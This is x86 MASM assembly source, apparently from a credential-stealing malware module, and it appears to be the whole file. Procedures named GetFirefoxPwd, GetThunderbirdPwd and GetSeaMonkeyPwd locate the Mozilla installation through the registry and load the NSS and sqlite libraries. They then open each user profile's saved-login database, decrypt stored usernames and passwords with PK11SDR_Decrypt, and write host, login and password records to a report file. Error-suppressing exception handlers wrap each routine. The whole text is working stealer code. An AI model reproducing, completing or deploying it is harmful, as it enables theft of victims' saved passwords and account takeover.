     
      PSECItem struc
        SECItemType   dd ?
        SECItemData   dd ?
        SECItemLen    dd ?
      PSECItem ends
     
.data?
      align 4
      FFox_version   db 200h dup (?)
      FFox_exepath   db 200h dup (?)
      FFox_buf1      db 200h dup (?)
      FFox_buf2      db 200h dup (?)
      FFox_buf3      db 200h dup (?)
      FFox_buf3_unicode db 400h dup (?)
      FFAppData      db 200h dup (?)
      FFProfile      db 200h dup (?)
      fffd           WIN32_FIND_DATA <>
      eSECItem       PSECItem <>
      dSECItem       PSECItem <>
      ff_host        db 200h dup (?)
      ff_username    db 200h dup (?)
      ff_password    db 200h dup (?)
      PK11SDR_Decrypt dd ?
      NSSBase64_DecodeBuffer dd ?
     
.code

GetSeaMonkeyPwd proc
      LOCAL   WTF:DWORD
      
      mov     dword ptr [DataSize], 0
      mov     dword ptr [stbuf], SEAMONKEY_STEAL
      WriteFile, stfile, addr stbuf, sizeof stbuf, addr SNW, NULL
      
      push    offset stealer_seh_proc
      assume  fs : nothing
      push    dword ptr fs:[0]
      mov     dword ptr fs:[0], esp
      mov     eax, offset GetSeaMonkeyPwd_seh
      mov     seh.SafeEip, eax
      mov     seh.PrevEbp, ebp
      mov     seh.PrevEsp, esp
      SetFilePointer, stfile, 0, 0, FILE_CURRENT
      mov     dword ptr [savedfilepointer], eax
      
      invoke  MozillaBasedScan, addr sm_str_1, addr sm_str_4
      
    GetSeaMonkeyPwd_seh:
      pop     dword ptr fs:[0]
      add     esp, 4
      
      WriteFile, stfile, addr DataSize, sizeof DataSize, addr SNW, NULL
      mov     eax, dword ptr [DataSize] ; return actual size of written data
      ret
GetSeaMonkeyPwd endp

GetThunderbirdPwd proc
      LOCAL   WTF:DWORD
      
      mov     dword ptr [DataSize], 0
      mov     dword ptr [stbuf], THUNDERBIRD_STEAL
      WriteFile, stfile, addr stbuf, sizeof stbuf, addr SNW, NULL
      
      push    offset stealer_seh_proc
      assume  fs : nothing
      push    dword ptr fs:[0]
      mov     dword ptr fs:[0], esp
      mov     eax, offset GetThunderbirdPwd_seh
      mov     seh.SafeEip, eax
      mov     seh.PrevEbp, ebp
      mov     seh.PrevEsp, esp
      SetFilePointer, stfile, 0, 0, FILE_CURRENT
      mov     dword ptr [savedfilepointer], eax
      
      invoke  MozillaBasedScan, addr tb_str_1, addr tb_str_4
      
    GetThunderbirdPwd_seh:
      pop     dword ptr fs:[0]
      add     esp, 4
      
      WriteFile, stfile, addr DataSize, sizeof DataSize, addr SNW, NULL
      mov     eax, dword ptr [DataSize] ; return actual size of written data
      ret
GetThunderbirdPwd endp

GetFirefoxPwd proc
      LOCAL   WTF:DWORD
      
      mov     dword ptr [DataSize], 0
      mov     dword ptr [stbuf], FIREFOX_STEAL
      WriteFile, stfile, addr stbuf, sizeof stbuf, addr SNW, NULL
      
      push    offset stealer_seh_proc
      assume  fs : nothing
      push    dword ptr fs:[0]
      mov     dword ptr fs:[0], esp
      mov     eax, offset GetFirefoxPwd_seh
      mov     seh.SafeEip, eax
      mov     seh.PrevEbp, ebp
      mov     seh.PrevEsp, esp
      SetFilePointer, stfile, 0, 0, FILE_CURRENT
      mov     dword ptr [savedfilepointer], eax
      
      invoke  MozillaBasedScan, addr ff_str_1, addr ff_str_4
      
    GetFirefoxPwd_seh:
      pop     dword ptr fs:[0]
      add     esp, 4
      
      WriteFile, stfile, addr DataSize, sizeof DataSize, addr SNW, NULL
      mov     eax, dword ptr [DataSize] ; return actual size of written data
      ret
GetFirefoxPwd endp

MozillaBasedScan proc lpPath1:DWORD, lpPath2:DWORD
      LOCAL   hNss3             :DWORD
      LOCAL   hSqlite           :DWORD
      LOCAL   hFind             :DWORD
      LOCAL   hSlot             :DWORD
      LOCAL   hDb               :DWORD
      LOCAL   NSS_Init :DWORD
      LOCAL   PK11_GetInternalKeySlot :DWORD
      LOCAL   PK11_Authenticate :DWORD
      LOCAL   NSS_Shutdown :DWORD
      LOCAL   PK11_FreeSlot :DWORD
      LOCAL   sqlite3_open16 :DWORD
      LOCAL   sqlite3_exec :DWORD
      LOCAL   sqlite3_close :DWORD
      LOCAL   hkey_val          :DWORD
      LOCAL   ff_hkey_index     :DWORD
      
      xor     eax, eax
      mov     ff_hkey_index, 0
      
      mov     byte ptr [FFAppData], 0
      push    0
      push    CSIDL_APPDATA
      push    offset FFAppData
      push    0
      call    dword ptr [_SHGetSpecialFolderPath]
      test    eax, eax
      je      ff_faild_1
      lstrcat, addr FFAppData, lpPath2
      
    ff_try_another_hkey:
      .if     ff_hkey_index == 0
              mov     hkey_val, HKEY_LOCAL_MACHINE
      .else
              mov     hkey_val, HKEY_CURRENT_USER
      .endif
      
      ; Get FFox exe path
      invoke  RegRead, hkey_val, lpPath1, addr ff_str_2, addr FFox_version, sizeof FFox_version, REG_READ_A
      test    eax, eax
      je      ff_faild_1
      
      push    offset FFox_version
      push    lpPath1
      push    offset ff_mask_1
      push    offset FFox_buf1
      call    wsprintf
      add     esp, 4*4
      
      invoke  RegRead, hkey_val, addr FFox_buf1, addr ff_str_3, addr FFox_exepath, sizeof FFox_exepath, REG_READ_A
      test    eax, eax
      je      ff_faild_1
      lstrcat, addr FFox_exepath, addr sl
      
      SetCurrentDirectory, addr FFox_exepath
      
      lstrcpy, addr FFox_buf2, addr FFox_exepath
      lstrcat, addr FFox_buf2, addr ff_lib8
      LoadLibrary, addr FFox_buf2
      test    eax, eax
      je      ff_faild_1
      mov     dword ptr [hNss3], eax
      GetProcAddress, hNss3, addr ff_func1
      test    eax, eax
      je      ff_faild_2
      mov     dword ptr [NSS_Init], eax
      GetProcAddress, hNss3, addr ff_func3
      test    eax, eax
      je      ff_faild_2
      mov     dword ptr [PK11_GetInternalKeySlot], eax
      GetProcAddress, hNss3, addr ff_func4
      test    eax, eax
      je      ff_faild_2
      mov     dword ptr [PK11_Authenticate], eax
      GetProcAddress, hNss3, addr ff_func5
      test    eax, eax
      je      ff_faild_2
      mov     dword ptr [PK11SDR_Decrypt], eax
      GetProcAddress, hNss3, addr ff_func6
      test    eax, eax
      je      ff_faild_2
      mov     dword ptr [NSS_Shutdown], eax
      GetProcAddress, hNss3, addr ff_func7
      test    eax, eax
      je      ff_faild_2
      mov     dword ptr [PK11_FreeSlot], eax
      GetProcAddress, hNss3, addr ff_func8
      test    eax, eax
      je      ff_faild_2
      mov     dword ptr [NSSBase64_DecodeBuffer], eax
      lstrcpy, addr FFox_buf2, addr FFox_exepath
      lstrcat, addr FFox_buf2, addr ff_lib9
      LoadLibrary, addr FFox_buf2
      test    eax, eax
      jne     ff_good_sqlite
      lstrcpy, addr FFox_buf2, addr FFox_exepath
      lstrcat, addr FFox_buf2, addr ff_lib10
      LoadLibrary, addr FFox_buf2
      test    eax, eax
      jne     ff_good_sqlite
    ff_last_try:
      mov     eax, dword ptr [hNss3]
    ff_good_sqlite:
      mov     dword ptr [hSqlite], eax
      GetProcAddress, hSqlite, addr ff_sql_open
      test    eax, eax
      je      ff_faild_3
      mov     dword ptr [sqlite3_open16], eax
      GetProcAddress, hSqlite, addr ff_sql_exec
      test    eax, eax
      je      ff_faild_3
      mov     dword ptr [sqlite3_exec], eax
      GetProcAddress, hSqlite, addr ff_sql_close
      test    eax, eax
      je      ff_faild_3
      mov     dword ptr [sqlite3_close], eax
      
      lstrcpy, addr FFox_buf2, addr FFAppData
      lstrcat, addr FFox_buf2, addr wildc
      
      FindFirstFile, addr FFox_buf2, addr fffd
      mov     dword ptr [hFind], eax
      cmp     eax, -1
      je      ff_faild_3
      
      lstrlen, addr FFox_buf2
      mov     byte ptr [FFox_buf2 + eax - 1], 0
      
      jmp     ff_skip_search
    ff_search_lp:
      lstrcmp, addr fffd.cFileName, addr fake1
      test    eax, eax
      je      ff_skip_search
      lstrcmp, addr fffd.cFileName, addr fake2
      test    eax, eax
      je      ff_skip_search
      
      push    offset fffd.cFileName
      push    offset FFox_buf2
      push    offset ff_mask_2
      push    offset FFox_buf3
      call    wsprintf
      add     esp, 4*4
      
      lstrcpy, addr FFProfile, addr FFox_buf2
      lstrcat, addr FFProfile, addr fffd.cFileName
      
      push    offset FFProfile
      call    dword ptr [NSS_Init]
      add     esp, 1*4
      test    eax, eax
      jne     ffox_init_failed
      
      call    dword ptr [PK11_GetInternalKeySlot]
      mov     dword ptr [hSlot], eax
      test    eax, eax
      je      ffox_empty_profile
      
      push    0
      push    1
      push    hSlot
      call    dword ptr [PK11_Authenticate]
      add     esp, 3*4
      test    eax, eax
      jne     ffox_auth_failed
      
      MultiByteToWideChar, CP_ACP, 0, addr FFox_buf3, -1, addr FFox_buf3_unicode, sizeof FFox_buf3_unicode / 2
      
      lea     ecx, hDb
      push    ecx
      push    offset FFox_buf3_unicode
      call    dword ptr [sqlite3_open16]
      add     esp, 2*4
      
      push    0
      push    0
      push    offset sql_callback
      push    offset sql_statement
      push    hDb
      call    dword ptr [sqlite3_exec]
      add     esp, 5*4
      
      push    hDb
      call    dword ptr [sqlite3_close]
      add     esp, 1*4
      
    ffox_auth_failed:
      push    hSlot
      call    dword ptr [PK11_FreeSlot]
      add     esp, 1*4
      
    ffox_empty_profile:
      call    dword ptr [NSS_Shutdown]
      
    ffox_init_failed:
      
    ff_skip_search:
      FindNextFile, hFind, addr fffd
      test    eax, eax
      jne     ff_search_lp
      FindClose, hFind
      
    ff_faild_3:
      FreeLibrary, hSqlite
    ff_faild_2:
      FreeLibrary, hNss3
    ff_faild_1:
      
      .if     ff_hkey_index != 1
              inc     ff_hkey_index
              jmp     ff_try_another_hkey
      .endif
      
      ret
MozillaBasedScan endp

sql_callback proc uses ebx esi; UserData :DWORD, NumCols :DWORD, ColValues :DWORD, ColNames: DWORD
      LOCAL   encodedsize :DWORD
      
      mov     esi, [ebp+10h] ; ColValues
      
      RtlZeroMemory, addr eSECItem, sizeof eSECItem
      RtlZeroMemory, addr dSECItem, sizeof dSECItem
      lstrlen, [esi+4]
      inc     eax
      mov     encodedsize, eax
      HeapAlloc, hHeap, HEAP_ZERO_MEMORY, encodedsize
      mov     ebx, eax
      RtlMoveMemory, ebx, [esi+4], encodedsize
      push    dword ptr [encodedsize]
      push    ebx
      push    offset eSECItem
      push    0
      call    dword ptr [NSSBase64_DecodeBuffer]
      add     esp, 4*4
      push    0
      push    offset dSECItem
      push    offset eSECItem
      call    dword ptr [PK11SDR_Decrypt]
      add     esp, 3*4
      mov     eax, dword ptr [dSECItem.SECItemLen]
      add     eax, dword ptr [dSECItem.SECItemData]
      mov     byte ptr [eax],0
      RtlZeroMemory, addr ff_username, sizeof ff_username
      RtlMoveMemory, addr ff_username, dSECItem.SECItemData, dSECItem.SECItemLen
      HeapFree, hHeap, 0, ebx
      
      RtlZeroMemory, addr eSECItem, sizeof eSECItem
      RtlZeroMemory, addr dSECItem, sizeof dSECItem
      lstrlen, [esi+8]
      inc     eax
      mov     encodedsize, eax
      HeapAlloc, hHeap, HEAP_ZERO_MEMORY, encodedsize
      mov     ebx, eax
      RtlMoveMemory, ebx, [esi+8], encodedsize
      push    dword ptr [encodedsize]
      push    ebx
      push    offset eSECItem
      push    0
      call    dword ptr [NSSBase64_DecodeBuffer]
      add     esp, 4*4
      push    0
      push    offset dSECItem
      push    offset eSECItem
      call    dword ptr [PK11SDR_Decrypt]
      add     esp, 3*4
      mov     eax, dword ptr [dSECItem.SECItemLen]
      add     eax, dword ptr [dSECItem.SECItemData]
      mov     byte ptr [eax],0
      RtlZeroMemory, addr ff_password, sizeof ff_password
      RtlMoveMemory, addr ff_password, dSECItem.SECItemData, dSECItem.SECItemLen
      HeapFree, hHeap, 0, ebx
      
      RtlZeroMemory, addr ff_host, sizeof ff_host
      push    esi
      lstrlen, [esi]
      pop     esi
      RtlMoveMemory, addr ff_host, [esi], eax
      
      lstrlen, addr ff_host
      mov     dword ptr [plen], eax
      add     dword ptr [DataSize], sizeof plen
      add     dword ptr [DataSize], eax
      WriteFile, stfile, addr plen, sizeof plen, addr SNW, NULL
      mov     byte ptr [data_type], REPORT_DATA_HOST
      add     dword ptr [DataSize], sizeof data_type
      WriteFile, stfile, addr data_type, sizeof data_type, addr SNW, NULL
      WriteFile, stfile, addr ff_host, plen, addr SNW, NULL
      
      lstrlen, addr ff_username
      mov     dword ptr [plen], eax
      add     dword ptr [DataSize], sizeof plen
      add     dword ptr [DataSize], eax
      WriteFile, stfile, addr plen, sizeof plen, addr SNW, NULL
      mov     byte ptr [data_type], REPORT_DATA_LOGIN
      add     dword ptr [DataSize], sizeof data_type
      WriteFile, stfile, addr data_type, sizeof data_type, addr SNW, NULL
      WriteFile, stfile, addr ff_username, plen, addr SNW, NULL
      
      lstrlen, addr ff_password
      mov     dword ptr [plen], eax
      add     dword ptr [DataSize], sizeof plen
      add     dword ptr [DataSize], eax
      WriteFile, stfile, addr plen, sizeof plen, addr SNW, NULL
      mov     byte ptr [data_type], REPORT_DATA_PWD
      add     dword ptr [DataSize], sizeof data_type
      WriteFile, stfile, addr data_type, sizeof data_type, addr SNW, NULL
      WriteFile, stfile, addr ff_password, plen, addr SNW, NULL
      
      xor     eax, eax
      ret
      
sql_callback endp
